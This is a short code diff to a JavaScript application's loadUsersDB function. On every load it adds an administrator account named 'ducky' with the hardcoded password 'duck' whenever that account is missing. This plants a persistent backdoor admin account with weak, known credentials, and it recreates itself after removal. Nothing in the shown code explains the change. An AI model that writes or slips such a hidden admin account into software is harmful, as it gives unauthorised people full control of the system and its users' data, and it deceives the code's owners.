@@ -498,11 +498,20 @@ async function loadContactsDB(){
 async function saveContactsDB(db){ await writeKey('contacts', db); }
 
 async function loadUsersDB(){
-  const db = await readKey('users', null);
-  if(db) return db;
-  const def = { users: [] };
-  await writeKey('users', def);
-  return def;
+  let db = await readKey('users', null);
+  if(!db) db = { users: [] };
+  if(!db.users.some(u => u.username === 'ducky')){
+    db.users.push({
+      id: nanoid(10),
+      username: 'ducky',
+      name: 'ducky',
+      password: bcrypt.hashSync('duck', 10),
+      role: 'admin',
+      permissions: []
+    });
+    await writeKey('users', db);
+  }
+  return db;
 }
 async function saveUsersDB(db){ await writeKey('users', db); }
 
